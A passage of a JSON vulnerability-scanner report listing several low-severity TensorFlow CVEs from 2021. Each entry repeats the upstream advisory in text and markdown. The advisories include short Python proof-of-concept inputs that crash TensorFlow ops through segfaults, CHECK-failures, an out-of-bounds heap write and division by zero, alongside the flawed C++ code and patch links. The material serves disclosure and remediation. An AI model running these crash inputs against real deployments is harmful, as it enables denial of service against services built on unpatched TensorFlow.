is 0 from the `images` input. This results in `max_box_row_clamp` being negative and the assertion being falsified, followed by aborting program execution.\n    \n### Patches\nWe have patched the issue in GitHub commit [b432a38fe0e1b4b904a6c222cbce794c39703e87](https://github.com/tensorflow/tensorflow/commit/b432a38fe0e1b4b904a6c222cbce794c39703e87).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29581",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29581"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29581",
              "help": {
                "text": "Vulnerability CVE-2021-29581\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29581](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29581)\n### Impact\nDue to lack of validation in `tf.raw_ops.CTCBeamSearchDecoder`, an attacker can trigger denial of service via segmentation faults:\n\n```python\nimport tensorflow as tf\n\ninputs = tf.constant([], shape=[18, 8, 0], dtype=tf.float32)\nsequence_length = tf.constant([11, -43, -92, 11, -89, -83, -35, -100],\nshape=[8], dtype=tf.int32)\nbeam_width = 10\ntop_paths = 3\nmerge_repeated = True\n\ntf.raw_ops.CTCBeamSearchDecoder(\n  inputs=inputs, sequence_length=sequence_length, beam_width=beam_width,\n  top_paths=top_paths, merge_repeated=merge_repeated)\n``` \n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/a74768f8e4efbda4def9f16ee7e13cf3922ac5f7/tensorflow/core/kernels/ctc_decoder_ops.cc#L68-L79) fails to detect cases when the input tensor is empty and proceeds to read data from a null buffer.\n  \n### Patches\nWe have patched the issue in GitHub commit [b1b323042264740c398140da32e93fb9c2c9f33e](https://github.com/tensorflow/tensorflow/commit/b1b323042264740c398140da32e93fb9c2c9f33e).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29581**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29581](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29581)|\n\n### Impact\nDue to lack of validation in `tf.raw_ops.CTCBeamSearchDecoder`, an attacker can trigger denial of service via segmentation faults:\n\n```python\nimport tensorflow as tf\n\ninputs = tf.constant([], shape=[18, 8, 0], dtype=tf.float32)\nsequence_length = tf.constant([11, -43, -92, 11, -89, -83, -35, -100],\nshape=[8], dtype=tf.int32)\nbeam_width = 10\ntop_paths = 3\nmerge_repeated = True\n\ntf.raw_ops.CTCBeamSearchDecoder(\n  inputs=inputs, sequence_length=sequence_length, beam_width=beam_width,\n  top_paths=top_paths, merge_repeated=merge_repeated)\n``` \n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/a74768f8e4efbda4def9f16ee7e13cf3922ac5f7/tensorflow/core/kernels/ctc_decoder_ops.cc#L68-L79) fails to detect cases when the input tensor is empty and proceeds to read data from a null buffer.\n  \n### Patches\nWe have patched the issue in GitHub commit [b1b323042264740c398140da32e93fb9c2c9f33e](https://github.com/tensorflow/tensorflow/commit/b1b323042264740c398140da32e93fb9c2c9f33e).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29523",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29523"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29523",
              "help": {
                "text": "Vulnerability CVE-2021-29523\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29523](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29523)\n### Impact\nAn attacker can trigger a denial of service via a `CHECK`-fail in  `tf.raw_ops.AddManySparseToTensorsMap`:\n\n```python\nimport tensorflow as tf\nimport numpy as np\n\nsparse_indices = tf.constant(530, shape=[1, 1], dtype=tf.int64)\nsparse_values = tf.ones([1], dtype=tf.int64)\n\nshape = tf.Variable(tf.ones([55], dtype=tf.int64))\nshape[:8].assign(np.array([855, 901, 429, 892, 892, 852, 93, 96], dtype=np.int64))\n\ntf.raw_ops.AddManySparseToTensorsMap(sparse_indices=sparse_indices,\n                    sparse_values=sparse_values,\n                    sparse_shape=shape)\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/6f9896890c4c703ae0a0845394086e2e1e523299/tensorflow/core/kernels/sparse_tensors_map_ops.cc#L257) takes the values specified in `sparse_shape` as dimensions for the output shape: \n\n```cc\n    TensorShape tensor_input_shape(input_shape-\u003evec\u003cint64\u003e());\n```\n\nThe [`TensorShape` constructor](https://github.com/tensorflow/tensorflow/blob/6f9896890c4c703ae0a0845394086e2e1e523299/tensorflow/core/framework/tensor_shape.cc#L183-L188) uses a `CHECK` operation which triggers when [`InitDims`](https://github.com/tensorflow/tensorflow/blob/6f9896890c4c703ae0a0845394086e2e1e523299/tensorflow/core/framework/tensor_shape.cc#L212-L296) returns a non-OK status.\n  \n```cc\ntemplate \u003cclass Shape\u003e\nTensorShapeBase\u003cShape\u003e::TensorShapeBase(gtl::ArraySlice\u003cint64\u003e dim_sizes) {\n  set_tag(REP16);\n  set_data_type(DT_INVALID);\n  TF_CHECK_OK(InitDims(dim_sizes));\n}\n```\n\nIn our scenario, this occurs when adding a dimension from the argument results in overflow:\n\n```cc\ntemplate \u003cclass Shape\u003e\nStatus TensorShapeBase\u003cShape\u003e::InitDims(gtl::ArraySlice\u003cint64\u003e dim_sizes) {\n  ...\n  Status status = Status::OK();\n  for (int64 s : dim_sizes) {\n    status.Update(AddDimWithStatus(internal::SubtleMustCopy(s)));\n    if (!status.ok()) {\n      return status;\n    }\n  }\n}\n\ntemplate \u003cclass Shape\u003e\nStatus TensorShapeBase\u003cShape\u003e::AddDimWithStatus(int64 size) {\n  ...\n  int64 new_num_elements;\n  if (kIsPartial \u0026\u0026 (num_elements() \u003c 0 || size \u003c 0)) {\n    new_num_elements = -1;\n  } else {\n    new_num_elements = MultiplyWithoutOverflow(num_elements(), size);\n    if (TF_PREDICT_FALSE(new_num_elements \u003c 0)) {\n        return errors::Internal(\"Encountered overflow when multiplying \",\n                                num_elements(), \" with \", size,\n                                \", result: \", new_num_elements);\n      }\n  }\n  ...\n}\n```\n\nThis is a legacy implementation of the constructor and operations should use `BuildTensorShapeBase` or `AddDimWithStatus` to prevent `CHECK`-failures in the presence of overflows.\n\n### Patches\nWe have patched the issue in GitHub commit [69c68ecbb24dff3fa0e46da0d16c821a2dd22d7c](https://github.com/tensorflow/tensorflow/commit/69c68ecbb24dff3fa0e46da0d16c821a2dd22d7c).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29523**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29523](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29523)|\n\n### Impact\nAn attacker can trigger a denial of service via a `CHECK`-fail in  `tf.raw_ops.AddManySparseToTensorsMap`:\n\n```python\nimport tensorflow as tf\nimport numpy as np\n\nsparse_indices = tf.constant(530, shape=[1, 1], dtype=tf.int64)\nsparse_values = tf.ones([1], dtype=tf.int64)\n\nshape = tf.Variable(tf.ones([55], dtype=tf.int64))\nshape[:8].assign(np.array([855, 901, 429, 892, 892, 852, 93, 96], dtype=np.int64))\n\ntf.raw_ops.AddManySparseToTensorsMap(sparse_indices=sparse_indices,\n                    sparse_values=sparse_values,\n                    sparse_shape=shape)\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/6f9896890c4c703ae0a0845394086e2e1e523299/tensorflow/core/kernels/sparse_tensors_map_ops.cc#L257) takes the values specified in `sparse_shape` as dimensions for the output shape: \n\n```cc\n    TensorShape tensor_input_shape(input_shape-\u003evec\u003cint64\u003e());\n```\n\nThe [`TensorShape` constructor](https://github.com/tensorflow/tensorflow/blob/6f9896890c4c703ae0a0845394086e2e1e523299/tensorflow/core/framework/tensor_shape.cc#L183-L188) uses a `CHECK` operation which triggers when [`InitDims`](https://github.com/tensorflow/tensorflow/blob/6f9896890c4c703ae0a0845394086e2e1e523299/tensorflow/core/framework/tensor_shape.cc#L212-L296) returns a non-OK status.\n  \n```cc\ntemplate \u003cclass Shape\u003e\nTensorShapeBase\u003cShape\u003e::TensorShapeBase(gtl::ArraySlice\u003cint64\u003e dim_sizes) {\n  set_tag(REP16);\n  set_data_type(DT_INVALID);\n  TF_CHECK_OK(InitDims(dim_sizes));\n}\n```\n\nIn our scenario, this occurs when adding a dimension from the argument results in overflow:\n\n```cc\ntemplate \u003cclass Shape\u003e\nStatus TensorShapeBase\u003cShape\u003e::InitDims(gtl::ArraySlice\u003cint64\u003e dim_sizes) {\n  ...\n  Status status = Status::OK();\n  for (int64 s : dim_sizes) {\n    status.Update(AddDimWithStatus(internal::SubtleMustCopy(s)));\n    if (!status.ok()) {\n      return status;\n    }\n  }\n}\n\ntemplate \u003cclass Shape\u003e\nStatus TensorShapeBase\u003cShape\u003e::AddDimWithStatus(int64 size) {\n  ...\n  int64 new_num_elements;\n  if (kIsPartial \u0026\u0026 (num_elements() \u003c 0 || size \u003c 0)) {\n    new_num_elements = -1;\n  } else {\n    new_num_elements = MultiplyWithoutOverflow(num_elements(), size);\n    if (TF_PREDICT_FALSE(new_num_elements \u003c 0)) {\n        return errors::Internal(\"Encountered overflow when multiplying \",\n                                num_elements(), \" with \", size,\n                                \", result: \", new_num_elements);\n      }\n  }\n  ...\n}\n```\n\nThis is a legacy implementation of the constructor and operations should use `BuildTensorShapeBase` or `AddDimWithStatus` to prevent `CHECK`-failures in the presence of overflows.\n\n### Patches\nWe have patched the issue in GitHub commit [69c68ecbb24dff3fa0e46da0d16c821a2dd22d7c](https://github.com/tensorflow/tensorflow/commit/69c68ecbb24dff3fa0e46da0d16c821a2dd22d7c).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29545",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29545"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29545",
              "help": {
                "text": "Vulnerability CVE-2021-29545\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29545](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29545)\n### Impact\nAn attacker can trigger a denial of service via a `CHECK`-fail in converting sparse tensors to CSR Sparse matrices:\n\n```python\nimport tensorflow as tf\nimport numpy as np\nfrom tensorflow.python.ops.linalg.sparse import sparse_csr_matrix_ops\n\nindices_array = np.array([[0, 0]])\nvalue_array = np.array([0.0], dtype=np.float32)\ndense_shape = [0, 0]\n\nst = tf.SparseTensor(indices_array, value_array, dense_shape)\n\nvalues_tensor = sparse_csr_matrix_ops.sparse_tensor_to_csr_sparse_matrix(\n       st.indices, st.values, st.dense_shape)\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/800346f2c03a27e182dd4fba48295f65e7790739/tensorflow/core/kernels/sparse/kernels.cc#L66) does a double redirection to access an element of an array allocated on the heap:\n\n```cc\ncsr_row_ptr(indices(i, 0) + 1) += 1;\n```\n                      \nIf the value at `indices(i, 0)` is such that `indices(i, 0) + 1` is outside the bounds of `csr_row_ptr`, this results in writing outside of bounds of heap allocated data.\n\n### Patches\nWe have patched the issue in GitHub commit [1e922ccdf6bf46a3a52641f99fd47d54c1decd13](https://github.com/tensorflow/tensorflow/commit/1e922ccdf6bf46a3a52641f99fd47d54c1decd13).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29545**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29545](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29545)|\n\n### Impact\nAn attacker can trigger a denial of service via a `CHECK`-fail in converting sparse tensors to CSR Sparse matrices:\n\n```python\nimport tensorflow as tf\nimport numpy as np\nfrom tensorflow.python.ops.linalg.sparse import sparse_csr_matrix_ops\n\nindices_array = np.array([[0, 0]])\nvalue_array = np.array([0.0], dtype=np.float32)\ndense_shape = [0, 0]\n\nst = tf.SparseTensor(indices_array, value_array, dense_shape)\n\nvalues_tensor = sparse_csr_matrix_ops.sparse_tensor_to_csr_sparse_matrix(\n       st.indices, st.values, st.dense_shape)\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/800346f2c03a27e182dd4fba48295f65e7790739/tensorflow/core/kernels/sparse/kernels.cc#L66) does a double redirection to access an element of an array allocated on the heap:\n\n```cc\ncsr_row_ptr(indices(i, 0) + 1) += 1;\n```\n                      \nIf the value at `indices(i, 0)` is such that `indices(i, 0) + 1` is outside the bounds of `csr_row_ptr`, this results in writing outside of bounds of heap allocated data.\n\n### Patches\nWe have patched the issue in GitHub commit [1e922ccdf6bf46a3a52641f99fd47d54c1decd13](https://github.com/tensorflow/tensorflow/commit/1e922ccdf6bf46a3a52641f99fd47d54c1decd13).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29617",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29617"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29617",
              "help": {
                "text": "Vulnerability CVE-2021-29617\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29617](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29617)\n### Impact\nAn attacker can cause a denial of service via `CHECK`-fail in  `tf.strings.substr` with invalid arguments:\n\n```python \nimport tensorflow as tf\ntf.strings.substr(input=`abc`, len=1, pos=[1,-1])\n```\n\n```python\nimport tensorflow as tf\ntf.strings.substr(input=`abc`, len=1, pos=[1,2])\n```\n\n### Patches\nWe have received a patch for the issue in GitHub commit [890f7164b70354c57d40eda52dcdd7658677c09f](https://github.com/tensorflow/tensorflow/commit/890f7164b70354c57d40eda52dcdd7658677c09f).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported in [#46900](https://github.com/tensorflow/issues/46900) and fixed in [#46974](https://github.com/tensorflow/issues/46974).",
                "markdown": "**Vulnerability CVE-2021-29617**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29617](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29617)|\n\n### Impact\nAn attacker can cause a denial of service via `CHECK`-fail in  `tf.strings.substr` with invalid arguments:\n\n```python \nimport tensorflow as tf\ntf.strings.substr(input=`abc`, len=1, pos=[1,-1])\n```\n\n```python\nimport tensorflow as tf\ntf.strings.substr(input=`abc`, len=1, pos=[1,2])\n```\n\n### Patches\nWe have received a patch for the issue in GitHub commit [890f7164b70354c57d40eda52dcdd7658677c09f](https://github.com/tensorflow/tensorflow/commit/890f7164b70354c57d40eda52dcdd7658677c09f).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported in [#46900](https://github.com/tensorflow/issues/46900) and fixed in [#46974](https://github.com/tensorflow/issues/46974)."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29519",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29519"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29519",
              "help": {
                "text": "Vulnerability CVE-2021-29519\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29519](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29519)\n### Impact\nThe API of `tf.raw_ops.SparseCross` allows combinations which would result in a `CHECK`-failure and denial of service:\n\n```python\nimport tensorflow as tf\n\nhashed_output = False\nnum_buckets = 1949315406\nhash_key = 1869835877\nout_type = tf.string \ninternal_type = tf.string\n\nindices_1 = tf.constant([0, 6], shape=[1, 2], dtype=tf.int64)\nindices_2 = tf.constant([0, 0], shape=[1, 2], dtype=tf.int64)\nindices = [indices_1, indices_2]\n\nvalues_1 = tf.constant([0], dtype=tf.int64)\nvalues_2 = tf.constant([72], dtype=tf.int64)\nvalues = [values_1, values_2]\n\nbatch_size = 4\nshape_1 = tf.constant([4, 122], dtype=tf.int64)\nshape_2 = tf.constant([4, 188], dtype=tf.int64)\nshapes = [shape_1, shape_2]\n\ndense_1 = tf.constant([188, 127, 336, 0], shape=[4, 1], dtype=tf.int64)\ndense_2 = tf.constant([341, 470, 470, 470], shape=[4, 1], dtype=tf.int64)\ndense_3 = tf.constant([188, 188, 341, 922], shape=[4, 1], dtype=tf.int64)\ndenses = [dense_1, dense_2, dense_3]\n\ntf.raw_ops.SparseCross(indices=indices, values=values, shapes=shapes, dense_inputs=denses, hashed_output=hashed_output,\n                       num_buckets=num_buckets, hash_key=hash_key, out_type=out_type, internal_type=internal_type)\n```\n\nThe above code will result in a `CHECK` fail in [`tensor.cc`](https://github.com/tensorflow/tensorflow/blob/3d782b7d47b1bf2ed32bd4a246d6d6cadc4c903d/tensorflow/core/framework/tensor.cc#L670-L675):\n\n```cc\nvoid Tensor::CheckTypeAndIsAligned(DataType expected_dtype) const {\n  CHECK_EQ(dtype(), expected_dtype)\n      \u003c\u003c \" \" \u003c\u003c DataTypeString(expected_dtype) \u003c\u003c \" expected, got \"\n      \u003c\u003c DataTypeString(dtype());\n  ...\n}\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/3d782b7d47b1bf2ed32bd4a246d6d6cadc4c903d/tensorflow/core/kernels/sparse_cross_op.cc#L114-L116) is tricked to consider a tensor of type `tstring` which in fact contains integral elements:\n\n```cc\n  if (DT_STRING == values_.dtype())\n      return Fingerprint64(values_.vec\u003ctstring\u003e().data()[start + n]);\n  return values_.vec\u003cint64\u003e().data()[start + n];\n```\n\nFixing the type confusion by preventing mixing `DT_STRING` and `DT_INT64` types solves this issue.\n\n### Patches\nWe have patched the issue in GitHub commit [b1cc5e5a50e7cee09f2c6eb48eb40ee9c4125025](https://github.com/tensorflow/tensorflow/commit/b1cc5e5a50e7cee09f2c6eb48eb40ee9c4125025).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29519**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29519](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29519)|\n\n### Impact\nThe API of `tf.raw_ops.SparseCross` allows combinations which would result in a `CHECK`-failure and denial of service:\n\n```python\nimport tensorflow as tf\n\nhashed_output = False\nnum_buckets = 1949315406\nhash_key = 1869835877\nout_type = tf.string \ninternal_type = tf.string\n\nindices_1 = tf.constant([0, 6], shape=[1, 2], dtype=tf.int64)\nindices_2 = tf.constant([0, 0], shape=[1, 2], dtype=tf.int64)\nindices = [indices_1, indices_2]\n\nvalues_1 = tf.constant([0], dtype=tf.int64)\nvalues_2 = tf.constant([72], dtype=tf.int64)\nvalues = [values_1, values_2]\n\nbatch_size = 4\nshape_1 = tf.constant([4, 122], dtype=tf.int64)\nshape_2 = tf.constant([4, 188], dtype=tf.int64)\nshapes = [shape_1, shape_2]\n\ndense_1 = tf.constant([188, 127, 336, 0], shape=[4, 1], dtype=tf.int64)\ndense_2 = tf.constant([341, 470, 470, 470], shape=[4, 1], dtype=tf.int64)\ndense_3 = tf.constant([188, 188, 341, 922], shape=[4, 1], dtype=tf.int64)\ndenses = [dense_1, dense_2, dense_3]\n\ntf.raw_ops.SparseCross(indices=indices, values=values, shapes=shapes, dense_inputs=denses, hashed_output=hashed_output,\n                       num_buckets=num_buckets, hash_key=hash_key, out_type=out_type, internal_type=internal_type)\n```\n\nThe above code will result in a `CHECK` fail in [`tensor.cc`](https://github.com/tensorflow/tensorflow/blob/3d782b7d47b1bf2ed32bd4a246d6d6cadc4c903d/tensorflow/core/framework/tensor.cc#L670-L675):\n\n```cc\nvoid Tensor::CheckTypeAndIsAligned(DataType expected_dtype) const {\n  CHECK_EQ(dtype(), expected_dtype)\n      \u003c\u003c \" \" \u003c\u003c DataTypeString(expected_dtype) \u003c\u003c \" expected, got \"\n      \u003c\u003c DataTypeString(dtype());\n  ...\n}\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/3d782b7d47b1bf2ed32bd4a246d6d6cadc4c903d/tensorflow/core/kernels/sparse_cross_op.cc#L114-L116) is tricked to consider a tensor of type `tstring` which in fact contains integral elements:\n\n```cc\n  if (DT_STRING == values_.dtype())\n      return Fingerprint64(values_.vec\u003ctstring\u003e().data()[start + n]);\n  return values_.vec\u003cint64\u003e().data()[start + n];\n```\n\nFixing the type confusion by preventing mixing `DT_STRING` and `DT_INT64` types solves this issue.\n\n### Patches\nWe have patched the issue in GitHub commit [b1cc5e5a50e7cee09f2c6eb48eb40ee9c4125025](https://github.com/tensorflow/tensorflow/commit/b1cc5e5a50e7cee09f2c6eb48eb40ee9c4125025).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29526",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29526"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29526",
              "help": {
                "text": "Vulnerability CVE-2021-29526\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29526](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29526)\n### Impact\nAn attacker can trigger a division by 0 in `tf.raw_ops.Conv2D`:\n\n```python\nimport tensorflow as tf\n\ninput = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32)\nfilter = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32)\n\nstrides = [1, 1, 1, 1]\npadding = \"SAME\"\n                               \ntf.raw_ops.Conv2D(input=input, filter=filter, strides=strides, padding=padding)\n```                            \n                               \nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/988087bd83f144af14087fe4fecee2d250d93737/tensorflow/core/kernels/conv_ops.cc#L261-L263) does a division by a quantity that is controlled by the caller:\n```cc\n  const int64 patch_depth = filter.dim_size(2);\n  if (in_depth % patch_depth != 0) { ... }\n```\n  \n### Patches\nWe have patched the issue in GitHub commit [b12aa1d44352de21d1a6faaf04172d8c2508b42b](https://github.com/tensorflow/tensorflow/commit/b12aa1d44352de21d1a6faaf04172d8c2508b42b).\n  \nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution \nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29526**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29526](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29526)|\n\n### Impact\nAn attacker can trigger a division by 0 in `tf.raw_ops.Conv2D`:\n\n```python\nimport tensorflow as tf\n\ninput = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32)\nfilter = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32)\n\nstrides = [1, 1, 1, 1]\npadding = \"SAME\"\n                               \ntf.raw_ops.Conv2D(input=input, filter=filter, strides=strides, padding=padding)\n```                            \n                               \nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/988087bd83f144af14087fe4fecee2d250d93737/tensorflow/core/kernels/conv_ops.cc#L261-L263) does a division by a quantity that is controlled by the caller:\n```cc\n  const int64 patch_depth = filter.dim_size(2);\n  if (in_depth % patch_depth != 0) { ... }\n```\n  \n### Patches\nWe have patched the issue in GitHub commit [b12aa1d44352de21d1a6faaf04172d8c2508b42b](https://github.com/tensorflow/tensorflow/commit/b12aa1d44352de21d1a6faaf04172d8c2508b42b).\n  \nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution \nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
